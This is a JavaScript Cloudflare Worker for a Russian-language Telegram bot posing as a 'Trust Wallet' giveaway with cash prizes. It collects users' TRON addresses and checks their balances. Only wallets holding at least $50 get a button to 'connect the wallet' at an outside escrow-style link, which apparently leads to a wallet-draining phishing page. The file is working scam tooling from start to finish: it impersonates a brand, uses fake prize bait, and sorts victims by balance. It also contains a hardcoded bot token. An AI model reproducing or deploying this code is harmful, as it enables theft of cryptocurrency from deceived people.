// ==========================================
// НАСТРОЙКИ
// ==========================================

const BOT_TOKEN = "8967784999:AAFTnFXi1tE4USBH4eQEF_CkrfJpqbcH3uI";

// Твое фото
const PHOTO_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaG1Ay-no9Desc-6ZsW9vLJlUL4j2cVyNHDKs_OMgGBg&s=10";

// Ссылка, которую получит пользователь после успешной проверки
const REGISTRATION_LINK = "https://trust-escrow.casa/pay/5cc9f454-b14c-40fc-9fe8-f21baa163554";

// Минимальный баланс в долларах
const MIN_BALANCE_USD = 50;

// Курс TRX к USD (примерный, для расчета общего баланса)
const TRX_PRICE_USD = 0.25;


// ==========================================
// CLOUDFLARE WORKER ENTRY POINT
// ==========================================

export default {
  async fetch(request) {

    // Telegram всегда шлет POST запросы на вебхук
    if (request.method !== "POST") {
      return new Response("OK");
    }

    try {

      const update = await request.json();

      // Логируем для отладки (видно в консоли Cloudflare)
      console.log("UPDATE:", JSON.stringify(update));

      // Обрабатываем обычные сообщения (текст, старт)
      if (update.message) {
        await processMessage(update.message);
      }

      // Обрабатываем нажатия на кнопки
      if (update.callback_query) {
        await processCallback(update.callback_query);
      }

      return new Response("OK");

    } catch (error) {

      console.error("ERROR:", error);
      return new Response("ERROR", { status: 500 });
    }
  }
};


// ==========================================
// TELEGRAM API HELPER
// ==========================================

async function telegram(method, data) {

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }
  );

  const result = await response.json();
  
  // Можно раскомментировать для детальной отладки API ответов
  // console.log("API", method, JSON.stringify(result));

  return result;
}


// ==========================================
// ПРОВЕРКА БАЛАНСА TRON (В ФОНЕ)
// ==========================================

async function checkTronBalance(address) {
  try {
    // Запрос к публичному API TronGrid
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
    
    if (!response.ok) {
      return { eligible: false, reason: "Ошибка сети TronGrid." };
    }

    const data = await response.json();

    if (!data.data || data.data.length === 0) {
      return { eligible: false, reason: "Кошелек не найден или не активирован." };
    }

    const account = data.data[0];

    // 1. Баланс TRX (в sun, делим на 1 млн)
    const trxBalance = (account.balance || 0) / 1_000_000;

    // 2. Баланс USDT (TRC-20)
    let usdtBalance = 0;
    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Адрес контракта USDT в TRON
    
    if (account.trc20) {
      // Ищем USDT среди токенов
      for (const key in account.trc20) {
        if (key.includes(usdtContract)) {
          usdtBalance = account.trc20[key] / 1_000_000;
          break;
        }
      }
    }

    // Считаем общий баланс в USD
    const totalUsd = usdtBalance + (trxBalance * TRX_PRICE_USD);

    if (totalUsd >= MIN_BALANCE_USD) {
      return { eligible: true, balance: totalUsd };
    } else {
      return { 
        eligible: false, 
        reason: `Баланс слишком мал: ~$${totalUsd.toFixed(2)}. Нужно минимум $${MIN_BALANCE_USD}.` 
      };
    }

  } catch (err) {
    console.error("Balance Check Error:", err);
    return { eligible: false, reason: "Техническая ошибка проверки." };
  }
}


// ==========================================
// КЛАВИАТУРЫ
// ==========================================

// Главная кнопка старта
function startKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "🎁 Участвовать в розыгрыше", callback_data: "start_raffle" }]
    ]
  };
}

// Кнопка для регистрации (после успешной проверки)
function successKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "✅ Подключить кошелек для регистрации", url: REGISTRATION_LINK }]
    ]
  };
}


// ==========================================
// ОБРАБОТКА СООБЩЕНИЙ (/start и адреса)
// ==========================================

async function processMessage(message) {
  
  if (!message.from || !message.chat || !message.text) return;

  const chatId = message.chat.id;
  const userId = message.from.id;
  const text = message.text.trim();

  // 1. Команда /start
  if (text === "/start") {
    
    const caption = 
      "🔥 <b>МЕГА РОЗЫГРЫШ ОТ TRUST WALLET</b>\n\n" +
      "🏆 <b>Призовой фонд:</b>\n" +
      "• 3 победителя по $2000\n" +
      "• 5 победителей по $500\n\n" +
      "✅ Участие абсолютно бесплатно!\n" +
      "⚠️ <b>Важно:</b> Пустые кошельки не участвуют.\n" +
      "Минимальный баланс для допуска — <b>$50</b> в любых активах TRC-20.\n\n" +
      "Нажми кнопку ниже, чтобы начать 👇";

    await telegram("sendPhoto", {
      chat_id: chatId,
      photo: PHOTO_URL,
      caption: caption,
      parse_mode: "HTML",
      reply_markup: JSON.stringify(startKeyboard())
    });
    
    return;
  }

  // 2. Проверка, является ли текст адресом кошелька (начинается с T, длина 34)
  if (text.match(/^T[A-Za-z0-9]{33}$/)) {
    
    // Отправляем сообщение "Проверяю..."
    const loadingMsg = await telegram("sendMessage", {
      chat_id: chatId,
      text: "⏳ <i>Проверяю баланс в блокчейне...</i>",
      parse_mode: "HTML"
    });

    const messageId = loadingMsg.result.message_id;

    // Запускаем проверку
    const result = await checkTronBalance(text);

    if (result.eligible) {
      // УСПЕХ
      await telegram("editMessageText", {
        chat_id: chatId,
        message_id: messageId,
        text: "✅ <b>Кошелек подходит!</b>\n\n" +
              "Баланс подтвержден (> $50).\n" +
              "Вы допущены к участию.\n\n" +
              "👇 Нажмите кнопку ниже для финальной регистрации:",
        parse_mode: "HTML",
        reply_markup: JSON.stringify(successKeyboard())
      });
    } else {
      // ОТКАЗ
      await telegram("editMessageText", {
        chat_id: chatId,
        message_id: messageId,
        text: `❌ <b>Кошелек не подходит</b>\n\n` +
              `Причина: ${result.reason}\n\n` +
              `Пополните баланс или используйте другой кошелек.`,
        parse_mode: "HTML"
      });
    }
    
    return;
  }
}


// ==========================================
// ОБРАБОТКА CALLBACK (КНОПКИ)
// ==========================================

async function processCallback(callback) {
  
  if (!callback.data || !callback.from || !callback.message) return;

  const chatId = callback.message.chat.id;
  const messageId = callback.message.message_id;
  const userId = callback.from.id;

  // Нажата кнопка "Участвовать"
  if (callback.data === "start_raffle") {
    
    await telegram("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: "Отправьте адрес кошелька!"
    });

    await telegram("sendMessage", {
      chat_id: chatId,
      text: "📩 <b>Проверка кошелька</b>\n\n" +
            "Отправьте мне ваш адрес кошелька <b>TRC-20</b> (начинается на T...).\n\n" +
            "<i>Я проверю баланс в фоне и скажу, можете ли вы участвовать.</i>",
      parse_mode: "HTML"
    });
  }
}
